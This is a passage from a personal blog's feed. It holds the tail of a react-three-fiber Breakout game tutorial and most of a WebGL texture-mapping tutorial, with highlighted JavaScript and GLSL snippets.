scene &#125; = <span class="title function_">useThree</span>();</span><br><span class="line"><span class="keyword">const</span> raycaster = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Raycaster</span>();</span><br><span class="line">raycaster.<span class="title function_">set</span>(position, ballDirection);</span><br><span class="line"><span class="keyword">const</span> intersects = raycaster.<span class="title function_">intersectObjects</span>(scene.<span class="property">children</span>);</span><br><span class="line"><span class="keyword">if</span> (intersects.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;&#125; <span class="comment">// ball collisions</span></span><br></pre></td></tr></table></figure><p><strong>Possible problem:</strong> The main limitation of using Raycaster to test for collisions between a sphere and a box in three.js is that it is not very accurate. Raycaster can only detect collisions between two objects if the ray intersects with the surface of the object. This means that if the sphere is slightly offset from the box, the ray may not intersect with the surface of the sphere and the collision will not be detected. Additionally, Raycaster is not able to detect collisions between two objects that are moving, as the ray must be cast from a static point.</p><h2 id="Animate-the-ball"><a href="#Animate-the-ball" class="headerlink" title="Animate the ball"></a>Animate the ball</h2><p>Define speed as a constant and ballDirection as the direction of the ball‚Äôs motion on x and y. The useState hook is used to create a new Vector3 object with the initial position of (0, 0, 0). The useFrame hook is used to update the position of the Vector3 object.  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [position, setPosition] = <span class="title function_">useState</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="title function_">useFrame</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y &#125; = ballDirection;</span><br><span class="line">    <span class="keyword">const</span> newPosition = <span class="keyword">new</span> <span class="title class_">Vector3</span>(position.<span class="property">x</span> + x * speed, position.<span class="property">y</span> + y * speed, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_">setPosition</span>(newPosition);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Randomness-in-bounces"><a href="#Randomness-in-bounces" class="headerlink" title="Randomness in bounces"></a>Randomness in bounces</h2><p>When the ball hits a wall, brick or racket, it should bounce off at a reflected angle of arrival, like Specular as follows. But there is a limitation that the ball will always bounce off the walls and blocks at the same angle, no matter where it hits. The trajectory of the ball is fixed, and there will be positions that the ball cannot reach, making the game uninteresting.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; x, y &#125; = ballDirection;</span><br><span class="line"><span class="keyword">if</span> (distance &lt; <span class="variable constant_">RADIUS</span> &amp;&amp; intersectedObject) &#123;</span><br><span class="line">    <span class="keyword">if</span> (intersectedObject === <span class="string">&quot;paddle&quot;</span>)</span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x, y * -<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (intersectedObject === <span class="string">&quot;topWall&quot;</span>) </span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x, y * -<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ([<span class="string">&quot;leftWall&quot;</span>, <span class="string">&quot;rightWall&quot;</span>].<span class="title function_">includes</span>(intersectedObject)) </span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x * -<span class="number">1</span>, y, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (intersectedObject === <span class="string">&quot;brick&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">setBallDirection</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(x * -<span class="number">1</span>, y * -<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For a better physics experience, randomness can be added to the calculation of the reflection angle of the ball. Here is an example:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getFlag</span> = n =&gt; n &gt; <span class="number">0</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randomReflect</span> = (<span class="params">xv, yv, <span class="keyword">from</span>, to</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> xFlag = <span class="title function_">getFlag</span>(xv);</span><br><span class="line">  <span class="keyword">let</span> yFlag = <span class="title function_">getFlag</span>(yv);</span><br><span class="line">  <span class="keyword">let</span> angle = <span class="title class_">Math</span>.<span class="title function_">random</span>() * (to - <span class="keyword">from</span>) + <span class="keyword">from</span>; </span><br><span class="line">  <span class="keyword">let</span> x = <span class="title class_">Math</span>.<span class="title function_">cos</span>(angle * <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">180</span>);</span><br><span class="line">  <span class="keyword">let</span> y = <span class="title class_">Math</span>.<span class="title function_">sin</span>(angle * <span class="title class_">Math</span>.<span class="property">PI</span> / <span class="number">180</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Vector3</span>(<span class="title class_">Math</span>.<span class="title function_">abs</span>(x) * xFlag, <span class="title class_">Math</span>.<span class="title function_">abs</span>(y) * yFlag, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randomLRWallReflect</span> = (<span class="params">xv, yv</span>) =&gt; <span class="title function_">randomReflect</span>(xv, yv, -<span class="number">60</span>, <span class="number">60</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">randomTBWallReflect</span> = (<span class="params">xv, yv</span>) =&gt; <span class="title function_">randomReflect</span>(xv, yv, <span class="number">30</span>, <span class="number">150</span>);</span><br></pre></td></tr></table></figure><p>The ball should bounce off the walls by reversing its x-velocity. For example, if the ball is moving to the right, when it collides with the left wall, its x-velocity should be reversed and it should start moving to the left. The same applies for the right wall.<br>On this basis, add the randomness of the angle with a range limitation.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([<span class="string">&quot;leftWall&quot;</span>, <span class="string">&quot;rightWall&quot;</span>].<span class="title function_">includes</span>(intersectedObject)) &#123;</span><br><span class="line">    <span class="title function_">setBallDirection</span>(<span class="title function_">randomLRWallReflect</span>(x * -<span class="number">1</span>, y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Disappearing-bricks"><a href="#Disappearing-bricks" class="headerlink" title="Disappearing bricks"></a>Disappearing bricks</h2><p>The brick disappears when the ball hits it. The game ends when all the bricks disappear.<br>Remove the object from a scene by <code>scene.remove()</code>. It takes a single argument, which is the object to be removed. It removes the object from the scene and all of its associated properties, such as its position, rotation, scale, and any other properties that were set on the object.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; scene &#125; = <span class="title function_">useThree</span>();</span><br><span class="line"><span class="keyword">const</span> bricks = intersects.<span class="title function_">filter</span>(<span class="function"><span class="params">i</span> =&gt;</span> i.<span class="property">object</span>.<span class="property">name</span> === <span class="string">&quot;brick&quot;</span> &amp;&amp; i.<span class="property">distance</span> &lt; <span class="variable constant_">RADIUS</span>);</span><br><span class="line">bricks.<span class="title function_">forEach</span>(<span class="function"><span class="params">i</span> =&gt;</span> scene.<span class="title function_">remove</span>(i.<span class="property">object</span>));</span><br></pre></td></tr></table></figure><h2 id="Track-score"><a href="#Track-score" class="headerlink" title="Track score"></a>Track score</h2><p>When the ball collides with bricks, update the score according to the number of bricks.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [score, setScore] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">updateScore</span> = (<span class="params">count</span>) =&gt; <span class="title function_">setScore</span>(score + count);</span><br></pre></td></tr></table></figure><h2 id="Add-music"><a href="#Add-music" class="headerlink" title="Add music"></a>Add music</h2><p>On game events play a sound, e.g. on ball collisions. I selected free sound samples from <a href="https://test.tosound.com/">here</a>. We are going to add sound effects for: when the ball hitting the paddle, and when the ball hitting a brick.<br>Create a new <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAudioElement/Audio">Audio()</a> object and set the source to the file that want to play, then call the play() method on the Audio() object to begin playing the sound.<br>For example:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sound = <span class="keyword">new</span> <span class="title class_">Audio</span>(<span class="string">&#x27;sound.wav&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">playSound</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    sound.<span class="property">currentTime</span> = <span class="number">0</span>;</span><br><span class="line">    sound.<span class="property">volume</span> = <span class="number">1</span>;</span><br><span class="line">    sound.<span class="title function_">play</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">playSound</span>();</span><br></pre></td></tr></table></figure><p><strong>Possible problem:</strong> <code>play() failed because the user didn‚Äòt interact with the document</code>. My solution was to add a start button.</p><h2 id="3D-view-control"><a href="#3D-view-control" class="headerlink" title="3D view control"></a>3D view control</h2><p>The <code>OrbitControls</code> component provides a convenient way to interact with a 3D scene without having to manually update the camera position. With it we can control the 3D camera which allows for panning, zooming, and rotating around a target point in all directions by mouse and touch events. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">OrbitControls</span> autoRotateSpeed=&#123;<span class="number">0.85</span>&#125; zoomSpeed=&#123;<span class="number">0.75</span>&#125; minPolarAngle=&#123;<span class="number">1</span>&#125; maxPolarAngle=&#123;<span class="title class_">Math</span>.<span class="property">PI</span>&#125; /&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/19/LuYFsrJ9wI1HtkX.png" alt="OrbitControls.png"></p><hr><p>References:</p><ul><li><a href="https://docs.pmnd.rs/react-three-fiber/getting-started/your-first-scene">React Three Fiber</a></li><li><a href="https://codeworkshop.dev/blog/2020-06-23-build-a-game-with-react-three-fiber-and-recoil/">Build a Game with React Three Fiber and Recoil</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Games/Techniques/3D_collision_detection">3D collision detection</a></li></ul><p>üîç Check out my code in <a href="https://github.com/Beking0912/breakout"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#115;&#117;&#x35;&#x40;&#110;&#99;&#x73;&#117;&#46;&#101;&#100;&#x75;">&#98;&#115;&#117;&#x35;&#x40;&#110;&#99;&#x73;&#117;&#46;&#101;&#100;&#x75;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Are you a fan of classic games like Breakout, but looking to add a modern twist?&lt;br&gt;Look no further than @react-three&amp;#x2F;fiber, a power</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="WebGL" scheme="https://beking0912.github.io/tags/WebGL/"/>
    
    <category term="React" scheme="https://beking0912.github.io/tags/React/"/>
    
  </entry>
  
  <entry>
    <title>üßö‚Äç‚ôÄÔ∏è Texture Mapping in WebGL</title>
    <link href="https://beking0912.github.io/2022/11/11/Rendering-textured-and-transparent-models-in-WebGL/"/>
    <id>https://beking0912.github.io/2022/11/11/Rendering-textured-and-transparent-models-in-WebGL/</id>
    <published>2022-11-12T01:26:31.000Z</published>
    <updated>2023-02-19T19:16:30.308Z</updated>
    
    <content type="html"><![CDATA[<p>Texture mapping is the process of applying a 2D image to a 3D model, and is a crucial part of creating visually appealing 3D graphics. However, it can also be one of the most frustrating parts of working with WebGL, particularly when it comes to solving common problems like texture distortion or mapping errors. </p><p>In this tutorial, we‚Äôll explore the basics of texture mapping in WebGL, and provide solutions for some of the most common problems you might encounter. I hope my article can help you have a better understanding of texture mapping in WebGL.</p><h2 id="Load-Textures"><a href="#Load-Textures" class="headerlink" title="Load Textures"></a>Load Textures</h2><h3 id="Download-image"><a href="#Download-image" class="headerlink" title="Download image"></a>Download image</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initTextures</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> texture = gl.<span class="title function_">createTexture</span>();</span><br><span class="line">    gl.<span class="title function_">pixelStorei</span>(gl.<span class="property">UNPACK_FLIP_Y_WEBGL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> image = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    image.<span class="property">crossOrigin</span> = <span class="string">&quot;anonymous&quot;</span>;</span><br><span class="line">    image.<span class="property">src</span> = url;</span><br><span class="line">    image.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="title function_">loadTexture</span>(image, texture); &#125;</span><br><span class="line">    <span class="keyword">return</span> texture;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="‚ùìPossible-problem"><a href="#‚ùìPossible-problem" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: The image element contains cross-origin data.</strong><br>WebGL just bans all images that are not from the same domain(CORS).<br>The easiest solution is to set the crossOrigin attribute to ‚Äúanonymous‚Äù which means ask for permission but don‚Äôt send extra info. And then when the browser tries to get the image from the server, if it‚Äôs not the same domain, the browser will ask for CORS permission. What‚Äôs more, We can make a judgement here that checks if the image we‚Äôre trying to load is on the same origin and if so sets the crossOrigin attribute.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title function_">URL</span>(url, <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>)).<span class="property">origin</span> !== <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">origin</span>)</span><br><span class="line">    image.<span class="property">crossOrigin</span> = <span class="string">&quot;anonymous&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="gl-pixelStorei"><a href="#gl-pixelStorei" class="headerlink" title="gl.pixelStorei"></a>gl.pixelStorei</h3><p><strong>gl.pixelStorei(gl.UNPACK_FLIP_Y_WEBGL, true)</strong>: Flip the orientation of the image on the Y axis. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/pixelStorei">[MDN]</a><br>The texture coordinates are independent of the size of the image itself, the upper right corner is always (1.0, 1.0) regardless of the image size. Browsers copy pixels from the loaded image in top-to-bottom order just like the left one, but the t-axis of the texture coordinate system in WebGL is opposite to the y-axis of the image coordinate system like the right one, so we need to flip the image first to map the image to the graphics correctly.</p><p><img src="https://s2.loli.net/2022/11/18/SoJL3aBqK7hiycj.png" alt="12.png"></p><h4 id="‚ùìPossible-problem-1"><a href="#‚ùìPossible-problem-1" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: Still rendering in wrong order.</strong><br>I tried to invert the y-axis of the image directly using the image preprocessing functions in WebGL, named pixelStorei. But this is still different from the target output, so I did one more step, Let x be equal to 1 minus x in the vertex shader.<br><img src="https://s2.loli.net/2022/11/18/P1HnAEOamzNGk6r.png" alt="13.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">pixelStorei</span>(gl.<span class="property">UNPACK_FLIP_Y_WEBGL</span>, <span class="number">1</span>)</span><br><span class="line">vTexture = aTexture * <span class="title function_">vec2</span>(-<span class="number">1.0</span>, <span class="number">1.0</span>) + <span class="title function_">vec2</span>(<span class="number">1.0</span>, <span class="number">0.0</span>); </span><br><span class="line"><span class="variable constant_">OR</span> vTexture = <span class="title function_">vec2</span>(<span class="number">1.0</span> - aTexture.<span class="property">x</span>, aTexture.<span class="property">y</span>); </span><br></pre></td></tr></table></figure><p>Of course, we can also make changes directly in the vertex shader without flipping the color map.<br><img src="https://s2.loli.net/2022/11/18/1NYM8sCuScRV42i.png" alt="14.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vTexture = <span class="title function_">vec2</span>(aTexture.<span class="property">x</span>, <span class="number">1.0</span> - aTexture.<span class="property">y</span>); </span><br><span class="line">vTexture = vTexture * <span class="title function_">vec2</span>(-<span class="number">1.0</span>, <span class="number">1.0</span>) + <span class="title function_">vec2</span>(<span class="number">1.0</span>, <span class="number">0.0</span>);</span><br></pre></td></tr></table></figure><h3 id="gl-activeTexture"><a href="#gl-activeTexture" class="headerlink" title="gl.activeTexture"></a>gl.activeTexture</h3><p><strong>gl.activeTexture(gl.TEXTURE0)</strong>: Make the ‚Äútexture unit‚Äù 0 be the active texture unit. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/activeTexture">[MDN]</a><br>WebGL uses multiple textures at the same time through texture units. Each texture unit has a number to manage a texture object, and the built-in variables gl.TEXTURE0 to gl.TEXTURE7 each represent a texture unit. Before a texture unit can be used, gl.activeTexture(gl.TEXTURE0) needs to be called to activate it. Only the active object can be modified or used.</p><h3 id="gl-bindTexture"><a href="#gl-bindTexture" class="headerlink" title="gl.bindTexture"></a>gl.bindTexture</h3><p><strong>gl.bindTexture(gl.TEXTURE_2D, texture)</strong>: Make the ‚Äútexture object‚Äù be the active texture object. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/bindTexture">[MDN]</a><br>In WebGL we can‚Äôt manipulate texture objects directly, we have to bind texture objects to texture units and then manipulate texture objects by manipulating texture units. This also declares that the texture object will hold a texture of type gl.TEXTURE_2D. The type of the texture, gl.TEXTURE_2D, can‚Äôt be changed after this initialization. <a href="http://learnwebgl.brown37.net/10_surface_properties/texture_mapping_images.html">[learnwebgl]</a></p><h3 id="gl-texParameteri"><a href="#gl-texParameteri" class="headerlink" title="gl.texParameteri"></a>gl.texParameteri</h3><p>Configure the parameters of the texture object: how to get the texture color according to the texture coordinates, which way to repeat the texture filling. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/texParameter">[MDN]</a> When a pixel corresponds to many texture pixels, regardless of NEARES or LINEAR, jaggedness will be a problem. The solution is to use small size textures so that each pixel does not correspond to many pixels. However, for objects close to the observer, small size textures can cause texture stretching, which looks like a blocky effect or blurring effect.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_S</span>, gl.<span class="property">CLAMP_TO_EDGE</span>);</span><br><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_T</span>, gl.<span class="property">CLAMP_TO_EDGE</span>);</span><br><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_MAG_FILTER</span>, gl.<span class="property">LINEAR</span>);</span><br><span class="line">gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_MIN_FILTER</span>, gl.<span class="property">LINEAR_MIPMAP_NEAREST</span>);</span><br></pre></td></tr></table></figure><h4 id="‚ùìPossible-problem-2"><a href="#‚ùìPossible-problem-2" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: The texture is a non-power-of-two texture.</strong><br>In WebGL, non-power-of-two textures are allowed, but there are limitations: Mipmap cannot be used if texture is non-power-of-two. The only repeat mode allowed is gl.CLAMP_TO_EDGE.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isPowerOf2</span>(image.<span class="property">width</span>) &amp;&amp; <span class="title function_">isPowerOf2</span>(image.<span class="property">height</span>)) &#123; </span><br><span class="line">    <span class="comment">// Yes, it&#x27;s a power of 2. Generate mips. </span></span><br><span class="line">    gl.<span class="title function_">generateMipmap</span>(gl.<span class="property">TEXTURE_2D</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// No, it&#x27;s not a power of 2. Turn off mips and set </span></span><br><span class="line">    gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_S</span>, gl.<span class="property">CLAMP_TO_EDGE</span>); </span><br><span class="line">    gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_WRAP_T</span>, gl.<span class="property">CLAMP_TO_EDGE</span>); </span><br><span class="line">    gl.<span class="title function_">texParameteri</span>(gl.<span class="property">TEXTURE_2D</span>, gl.<span class="property">TEXTURE_MIN_FILTER</span>, gl.<span class="property">LINEAR</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="gl-texImage2D"><a href="#gl-texImage2D" class="headerlink" title="gl.texImage2D"></a>gl.texImage2D</h3><p><strong>gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, image)</strong>: Store in the image in the GPU‚Äôs texture object. <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGLRenderingContext/texImage2D">[MDN]</a><br>Assigns a texture image to a texture object, and this function also allows to tell the WebGL system about some properties of the image.</p><h3 id="gl-uniform1"><a href="#gl-uniform1" class="headerlink" title="gl.uniform1*"></a>gl.uniform1*</h3><p><strong>gl.uniform1i(uniformVar, texUnit)</strong>: Specify the texture unit number and pass it to the corresponding texture uniform variable.</p><h4 id="‚ùìPossible-problem-3"><a href="#‚ùìPossible-problem-3" class="headerlink" title="‚ùìPossible problem"></a>‚ùìPossible problem</h4><p><strong>ERROR: Uniform type does not match uniform method.</strong><br>gl.uniform1f(u_alpha, alpha): A floating point Number for floating point values.<br>gl.uniform1i: An integer Number for integer values.<br>Prone to typo. In my case, the value of alpha is a single floating point number, so the corresponding uniform variable is set using gl.uniform1f. </p><h2 id="Texture-Mapping"><a href="#Texture-Mapping" class="headerlink" title="Texture Mapping"></a>Texture Mapping</h2><p><img src="https://s2.loli.net/2022/11/18/T9XjlZYQqz12UN6.png" alt="15.png"></p><h2 id="Update-Shaders"><a href="#Update-Shaders" class="headerlink" title="Update Shaders"></a>Update Shaders</h2><p>In the vertex shader, creating a varying variable that will interpolate the texture coordinates across the surface of a triangle. In the fragment shader, use the texture coordinates to lookup a color from the texture image. <a href="http://learnwebgl.brown37.net/10_surface_properties/texture_mapping_images.html">[learnwebgl]</a></p><h3 id="Vertex-Shader"><a href="#Vertex-Shader" class="headerlink" title="Vertex Shader"></a>Vertex Shader</h3><p>Define vertex shader in essl using es6 template strings. Two things will be done here: pass the texture unit to the slice shader; transfer texture coordinates from vertex shader to vertex shader.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> vShaderCode = `</span><br><span class="line">    attribute vec4 aVertexPosition;</span><br><span class="line">    attribute vec2 aTextureCoord;</span><br><span class="line"></span><br><span class="line">    uniform mat4 uModelViewMatrix;</span><br><span class="line">    uniform mat4 uProjectionMatrix;</span><br><span class="line"></span><br><span class="line">    varying highp vec2 vTextureCoord;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">      gl_Position = uProjectionMatrix * uModelViewMatrix * aVertexPosition;</span><br><span class="line">      vTextureCoord = aTextureCoord;</span><br><span class="line">    &#125;</span><br><span class="line">`;</span><br></pre></td></tr></table></figure><h3 id="Fragment-Shader"><a href="#Fragment-Shader" class="headerlink" title="Fragment Shader"></a>Fragment Shader</h3><p>Define fragment shader in essl using es6 template strings. The GLSL ES built-in function texture2D() is used to get the pixel color from the texture map image by fetching the texel on the texture based on the value of the texture coordinates.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> fsSource = `</span><br><span class="line">    varying highp vec2 vTextureCoord;</span><br><span class="line"></span><br><span class="line">    uniform sampler2D uSampler;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">      gl_FragColor = texture2D(uSampler, vTextureCoord);</span><br><span class="line">    &#125;</span><br><span class="line">`;</span><br></pre></td></tr></table></figure><h2 id="Depth-Test"><a href="#Depth-Test" class="headerlink" title="Depth Test"></a>Depth Test</h2><p>By default, WebGL handles vertices in the order they are in the buffer in order to speed up drawing operations. If a vertex that is close is drawn first and a vertex that is far away is drawn later, the object that is far away that is drawn later obscures the object that is close instead. Depth monitoring takes the color of the pixel with the smaller z-value as the final drawn color, unless transparent objects need to be drawn, and depth detection is usually turned on.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">enable</span>(gl.<span class="property">DEPTH_TEST</span>); </span><br><span class="line">gl.<span class="title function_">disable</span>(gl.<span class="property">DEPTH_TEST</span>);</span><br></pre></td></tr></table></figure><h2 id="Alpha-Blending"><a href="#Alpha-Blending" class="headerlink" title="Alpha Blending"></a>Alpha Blending</h2><p>WebGL does not provide alpha blending by default, to turn on alpha blending, WebGL needs to use the source and target colors, and the blended color is calculated by the blending method set in gl.blendFunc. If the 3D scene is drawn with both opaque and translucent objects, the graphics should be drawn as following:</p><ul><li>Enable the hidden surface elimination: gl.enable(gl.DEPTH_TEST);</li><li>Draw all opaque objects;</li><li>Lock the write operation of the depth buffer used for hidden surface elimination so that it is read-only: gl.depthMask(false);</li><li>Draw all translucent objects, noting that they are to be sorted by depth and then drawn from back to front;</li><li>Release the depth buffer to make it readable and writable: gl.depthMask(true).<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (alpha == <span class="number">1</span>) &#123;</span><br><span class="line">    gl.<span class="title function_">disable</span>(gl.<span class="property">BLEND</span>);</span><br><span class="line">    gl.<span class="title function_">depthMask</span>(<span class="literal">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    gl.<span class="title function_">enable</span>(gl.<span class="property">BLEND</span>); <span class="comment">// enable alpha blending</span></span><br><span class="line">    gl.<span class="title function_">blendFunc</span>(gl.<span class="property">SRC_ALPHA</span>, gl.<span class="property">ONE_MINUS_SRC_ALPHA</span>); <span class="comment">// premultiplied</span></span><br><span class="line">    gl.<span class="title function_">depthMask</span>(<span class="literal">false</span>); <span class="comment">// disable depth mask</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><p>References:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API/Tutorial/Using_textures_in_WebGL#updating_the_shaders">Using textures in WebGL</a></li><li><a href="http://learnwebgl.brown37.net/10_surface_properties/texture_mapping_images.html">Texture Mapping Using Images</a></li><li><a 